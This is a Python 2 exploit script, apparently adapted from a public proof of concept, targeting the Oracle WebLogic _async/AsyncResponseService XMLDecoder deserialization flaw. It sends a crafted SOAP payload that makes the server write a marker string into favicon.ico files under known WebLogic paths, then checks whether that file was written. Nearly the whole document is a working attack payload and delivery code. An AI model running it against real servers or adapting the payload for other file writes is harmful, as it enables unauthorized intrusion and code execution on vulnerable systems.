#author: jas502n
#modified by skytina
#email: 3ky7in4@gmail.com
#date:  04/29/2019
import requests
import sys
import time

# url = "http://10.10.20.166:7001/_async/AsyncResponseService"


print '''
                               _____   _____ ______  
                              |  __ \ / ____|  ____| 
   __ _ ___ _   _ _ __   ___  | |__) | |    | |__    
  / _` / __| | | | '_ \ / __| |  _  /| |    |  __|   
 | (_| \__ \ |_| | | | | (__  | | \ \| |____| |____  
  \__,_|___/\__, |_| |_|\___| |_|  \_\\_____|______| 
             __/ |                                   
            |___/     By jas502n(Modified By skytina)
            
            No patch for cve-2017-10271
            
            _async/AsyncResponseService RCE   
'''


url = sys.argv[1]
vuln_dir ="/_async/AsyncResponseService"

vuln_url = url + vuln_dir
print "\n>>>>The Vuln Url: %s \n" % vuln_url
content = "O_o"+str(int(time.time()))
favicon_ico_lst = {
  "servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/favicon.ico":"/bea_wls_internal/favicon.ico",
  "servers/myserver/tmp/_WL_internal/bea_wls_internal/uwyp3r/war/favicon.ico":"/bea_wls_internal/favicon.ico",
  "servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/favicon.ico":"/_async/favicon.ico"
}

def asyncReponseHack(favicon_ico_path,url,favion_ico_url):
  payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\r\n      <void class=\"java.io.PrintWriter\">\r\n       <string>%s</string>\r\n    <void method=\"println\">\r\n            <string>%s</string>\r\n        </void>\r\n        <void method=\"close\"/></void>\r\n    </java>\r\n</work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>" % (favicon_ico_path,content)

  proxies = {
      "http":"http://127.0.0.1:8080"
  }

  headers = {
      'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
      'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      'Accept-Language': "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
      'Accept-Encoding': "gzip, deflate",
      'Cookie': "sidebar_collapsed=false",
      'X-Forwarded-For': "127.0.0.2",
      'Connection': "close",
      'Upgrade-Insecure-Requests': "1",
      'Content-Type': "text/xml",
      'Content-Length': "1001",
      'cache-control': "no-cache"
      }

  response = requests.request("POST", vuln_url, data=payload, headers=headers)

  url = "%s%s" % (url,favion_ico_url)
  #print(url)
  #print(response.text)
  
  exists_resp = requests.get(url,headers=headers)
  if exists_resp.content and content in exists_resp.content:
    return True
  else:
    return False

for each_file_path,favion_ico_path in favicon_ico_lst.iteritems():
  resultHack = asyncReponseHack(each_file_path,url,favion_ico_path)
  if resultHack:
    print("[*] %s is vulnerable! Create file: %s" % (url,each_file_path))
    break
else:
  print("[*] %s is not vulnerable!" % url)